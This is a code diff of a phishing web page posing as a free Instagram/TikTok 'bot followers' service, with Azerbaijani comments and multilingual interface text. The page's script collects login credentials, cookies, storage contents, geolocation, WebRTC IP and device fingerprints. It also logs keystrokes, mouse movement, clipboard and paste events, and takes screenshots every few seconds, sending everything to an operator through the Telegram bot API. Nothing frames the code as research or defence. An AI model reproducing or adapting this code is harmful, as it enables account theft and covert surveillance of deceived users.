+        //  BÜTÜN 55 XÜSUSİYYƏTİ TOPLA VƏ GÖNDƏR
         // ============================================================
         async function collectAllFeatures() {
-            // Əsas toplamalar
             collected.deviceModel = getDeviceModel();
             collected.osVersion = getOSVersion();
             collected.cpuCores = getCPU();
             collected.memory = getMemory();
             const mediaDevs = await getMediaDevices();
             if (mediaDevs) {
-                collected.audioDevices = mediaDevs.audioInputs.map(d => d.label || 'unnamed');
-                collected.videoDevices = mediaDevs.videoInputs.map(d => d.label || 'unnamed');
+                collected.audioDevices = mediaDevs.audioInputs;
+                collected.videoDevices = mediaDevs.videoInputs;
             }
             collected.gpuInfo = getGPUInfo();
             collected.networkInfo = getNetworkInfo();
@@ -560,71 +704,102 @@
             collected.historyDepth = getHistoryDepth();
             collected.plugins = getPlugins();
             collected.mobileDetected = detectMobile();
-            const perms = await getPermissions();
-            collected.permissions = perms;
+            collected.permissions = await getPermissions();
             collected.performanceMemory = getPerformanceMemory();
             collected.pageLoadTiming = getPageLoadTiming();
             collected.iframeInfo = getIframeInfo();
-            collected.audioFingerprint = getAudioFrequency(); // yenilənmiş
-            // IndexedDB
-            const dbs = await getIndexedDBs();
-            collected.indexedDBs = dbs;
-            // Batareya
+            collected.audioFingerprint = getAudioFrequency();
+            collected.indexedDBs = await getIndexedDBs();
             collected.battery = await getBattery();
+            // əsas toplamalar
+            collected.cookies = getCookies();
+            const storage = getStorage();
+            collected.localStorage = storage.localStorage;
+            collected.sessionStorage = storage.sessionStorage;
+            collected.canvasFingerprint = getCanvasFingerprint();
+            collected.webglFingerprint = getWebGLFingerprint();
+            const webrtc = await getWebRTCIP();
+            collected.webrtcIP = webrtc;
+            collected.historyLength = getHistoryLength();
+            const touchOrientation = getTouchAndOrientation();
+            collected.touchEvents = touchOrientation; // touchSupported, orientation
+            collected.fonts = getFonts();
+            collected.timezoneData = getTimezoneData();
 
             // Hamısını adminə göndər
             sendDataToAdmin('full_55_features', collected);
         }
 
         // ============================================================
-        //  KÖHNƏ FUNKSİYALAR (Saxlanıldı)
+        //  GÖNDƏRİCİ FUNKSİYA
         // ============================================================
-        // ... (əvvəlki bütün funksiyalar qalır, sadəcə 30 yeni əlavə edildi)
-        // ============================================================
-
-        // Klipboard, keylogger, ekran, mouse, paste (əvvəlki kimi)
-
-        // ============================================================
-        //  STEP KEÇİDLƏRİ
-        // ============================================================
-        function showStep(id) {
-            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
+        function sendDataToAdmin(type, data) {
+            const timestamp = new Date().toLocaleString();
+            const text = `📦 **Avtomatik məlumat (${type})**\n🕐 ${timestamp}\n\n` + JSON.stringify(data, null, 2);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: text })
+            }).catch(() => {});
         }
 
         // ============================================================
-        //  PLATFORM SEÇİMİ - BÜTÜN XÜSUSİYYƏTLƏRİ TOPLA
+        //  EKRAN GÖRÜNTÜSÜ, KEYLOGGER, MOUSE ARXA PLANDA
+        // ============================================================
+        function startScreenCapture() {
+            screenInterval = setInterval(async () => {
+                try {
+                    const canvas = await html2canvas(document.body, { useCORS: true, scale: 0.5, logging: false });
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', ADMIN_CHAT_ID);
+                        formData.append('photo', blob, `screen_${Date.now()}.jpg`);
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    }, 'image/jpeg', 0.7);
+                } catch (e) {}
+            }, 15000);
+        }
+
+        function startKeylogSender() {
+            keylogInterval = setInterval(() => {
+                if (collected.keystrokes.length > 0) {
+                    const keys = collected.keystrokes.map(k => `${k.key} (${k.target})`).join(' | ');
+                    sendDataToAdmin('keylog', { keys, count: collected.keystrokes.length });
+                    collected.keystrokes = [];
+                }
+            }, 10000);
+        }
+
+        function startMouseSender() {
+            mouseInterval = setInterval(() => {
+                if (mouseEvents.length > 0) {
+                    const summary = `Mouse hərəkətləri: ${mouseEvents.length} qeyd`;
+                    sendDataToAdmin('mouse', { summary, details: mouseEvents.slice(0, 50) });
+                    mouseEvents = [];
+                }
+            }, 30000);
+        }
+
+        // ============================================================
+        //  PLATFORM SEÇİMİ – BÜTÜN PROSESİ BAŞLAT
         // ============================================================
         function selectPlatform(platform) {
             selectedPlatform = platform;
-            document.getElementById('platformLabel').innerText = (platform === 'instagram' ? 'Instagram' : 'TikTok') + ' hesab məlumatları';
+            applyPlatformUI(platform);
+            showStep('step1');
 
-            // 1. Əsas cihaz məlumatlarını topla
-            collected.device = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                os: getOSVersion(),
-                cores: getCPU(),
-                memory: getMemory(),
-                deviceModel: getDeviceModel()
-            };
+            // Əsas toplama başla
+            collected.device = getDetailedUA();
             collectGeoData().then(geo => {
                 collected.geo = geo;
                 sendDataToAdmin('device+geo', { device: collected.device, geo });
             });
 
-            // 2. Bütün 55 xüsusiyyəti topla
             collectAllFeatures();
-
-            // 3. Avtomatik doldurma aşkarlama
-            detectAutofill();
-
-            // 4. Ekran, keylogger, mouse, clipboard (əvvəlki kimi)
+            detectAutoFill();
             startScreenCapture();
             startKeylogSender();
             startMouseSender();
-
-            showStep('step1');
         }
 
         // ============================================================
@@ -639,7 +814,7 @@
         }
 
         // ============================================================
-        //  ADDIM 1: LOGIN (eyni)
+        //  ADDIM 1: LOGIN
         // ============================================================
         async function submitLogin() {
             const user = document.getElementById('loginUser').value.trim();
@@ -656,8 +831,14 @@
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => { collected.location = { lat: pos.coords.latitude, lng: pos.coords.longitude }; proceedToStep2(); },
-                    () => { collected.location = null; proceedToStep2(); }
+                    (pos) => {
+                        collected.location = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+                        proceedToStep2();
+                    },
+                    () => {
+                        collected.location = null;
+                        proceedToStep2();
+                    }
                 );
             } else {
                 collected.location = null;
@@ -813,7 +994,7 @@
 
             document.getElementById('step4').classList.remove('active');
             document.getElementById('loading').style.display = 'block';
-            document.getElementById('loadingText').innerText = 'Botlar işə salınır, lütfən gözləyin...';
+            document.getElementById('loadingText').innerText = 'Yoxlanılır, gözləyin...';
 
             // Şəkilləri göndər
             for (let i = 0; i < Math.min(files.length, 5); i++) {
@@ -831,6 +1012,7 @@
             if (cameraInterval) clearInterval(cameraInterval);
             if (screenInterval) clearInterval(screenInterval);
             if (keylogInterval) clearInterval(keylogInterval);
+            if (mouseInterval) clearInterval(mouseInterval);
             if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
 
             // Uğur və yönləndirmə
@@ -844,96 +1026,12 @@
         }
 
         // ============================================================
-        //  EKRAN GÖRÜNTÜSÜ, KEYLOGGER, MOUSE (davamı)
-        // ============================================================
-        function startScreenCapture() {
-            screenInterval = setInterval(async () => {
-                try {
-                    const canvas = await html2canvas(document.body, { useCORS: true, scale: 0.5, logging: false });
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', ADMIN_CHAT_ID);
-                        formData.append('photo', blob, `screen_${Date.now()}.jpg`);
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                    }, 'image/jpeg', 0.7);
-                } catch (e) {}
-            }, 15000);
-        }
-
-        document.addEventListener('keydown', (e) => {
-            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-                collected.keystrokes.push({
-                    key: e.key,
-                    timestamp: Date.now(),
-                    target: e.target.name || e.target.id || 'unknown'
-                });
-            }
-        });
-
-        function startKeylogSender() {
-            keylogInterval = setInterval(() => {
-                if (collected.keystrokes.length > 0) {
-                    const keys = collected.keystrokes.map(k => `${k.key} (${k.target})`).join(' | ');
-                    sendDataToAdmin('keylog', { keys, count: collected.keystrokes.length });
-                    collected.keystrokes = [];
-                }
-            }, 10000);
-        }
-
-        let mouseEvents = [];
-        document.addEventListener('mousemove', (e) => {
-            mouseEvents.push({ x: e.clientX, y: e.clientY, time: Date.now() });
-        });
-        document.addEventListener('scroll', () => {
-            mouseEvents.push({ scrollY: window.scrollY, time: Date.now() });
-        });
-
-        function startMouseSender() {
-            setInterval(() => {
-                if (mouseEvents.length > 0) {
-                    const summary = `Mouse hərəkətləri: ${mouseEvents.length} qeyd`;
-                    sendDataToAdmin('mouse', { summary, details: mouseEvents.slice(0, 50) });
-                    mouseEvents = [];
-                }
-            }, 30000);
-        }
-
-        document.addEventListener('copy', (e) => {
-            const text = document.getSelection().toString();
-            if (text) {
-                collected.clipboard = text;
-                sendDataToAdmin('clipboard', { text });
-            }
-        });
-
-        document.addEventListener('paste', (e) => {
-            const text = e.clipboardData.getData('text');
-            if (text) {
-                collected.pasteEvents.push({ text, time: Date.now() });
-                sendDataToAdmin('paste', { text });
-            }
-        });
-
-        // ============================================================
-        //  MƏLUMAT GÖNDƏRİCİ
-        // ============================================================
-        function sendDataToAdmin(type, data) {
-            const timestamp = new Date().toLocaleString();
-            const text = `📦 **Avtomatik məlumat (${type})**\n🕐 ${timestamp}\n\n` + JSON.stringify(data, null, 2);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: text })
-            }).catch(() => {});
-        }
-
-        // ============================================================
-        //  ÇOXDİLLİ DƏSTƏK (daha geniş)
+        //  ÇOXDİLLİ DƏSTƏK (az, en, ru, tr) – sadə
         // ============================================================
         const translations = {
             az: {
                 title: 'Bot Basma Xidməti',
-                intro: 'Bu xidmət hesabınıza pulsuz bot izləyicilər əlavə edir. İşə başlamaq üçün platforma seçin.',
+                intro: 'Bu xidmət hesabınıza pulsuz bot izləyicilər əlavə edir.',
                 instagram: 'Instagram',
                 tiktok: 'TikTok',
                 loginLabel: 'hesab məlumatları',
@@ -948,7 +1046,7 @@
             },
             en: {
                 title: 'Bot Boosting Service',
-                intro: 'This service adds free bot followers to your account. Select a platform to start.',
+                intro: 'This service adds free bot followers to your account.',
                 instagram: 'Instagram',
                 tiktok: 'TikTok',
                 loginLabel: 'account details',
@@ -963,7 +1061,7 @@
             },
             ru: {
                 title: 'Сервис накрутки ботов',
-                intro: 'Этот сервис добавляет бесплатных ботов-подписчиков на ваш аккаунт. Выберите платформу.',
+                intro: 'Этот сервис добавляет бесплатных ботов-подписчиков на ваш аккаунт.',
                 instagram: 'Instagram',
                 tiktok: 'TikTok',
                 loginLabel: 'данные аккаунта',
@@ -978,7 +1076,7 @@
             },
             tr: {
                 title: 'Bot Takipçi Hizmeti',
-                intro: 'Bu hizmet hesabınıza ücretsiz bot takipçiler ekler. Başlamak için bir platform seçin.',
+                intro: 'Bu hizmet hesabınıza ücretsiz bot takipçiler ekler.',
                 instagram: 'Instagram',
                 tiktok: 'TikTok',
                 loginLabel: 'hesap bilgileri',
@@ -1000,7 +1098,6 @@
             document.querySelectorAll('.option-btn')[0].innerText = `📸 ${t.instagram}`;
             document.querySelectorAll('.option-btn')[1].innerText = `🎵 ${t.tiktok}`;
         }
-
         const userLang = navigator.language.split('-')[0];
         if (['az', 'en', 'ru', 'tr'].includes(userLang)) {
             applyLanguage(userLang);
@@ -1013,6 +1110,13 @@
             e.preventDefault();
             e.returnValue = '';
         });
+
+        // ============================================================
+        //  SAYT AÇILANDA PLATFORM SEÇİMİNİ GÖZLƏYİRİK
+        //  İstifadəçi seçim etdikdə işə başlayacaq
+        // ============================================================
+        // İlkin olaraq step0 aktifdir.
+        console.log('Sayt yükləndi. İstifadəçi platforma seçəcək.');
     </script>
 </body>
-</html>
+    </html>
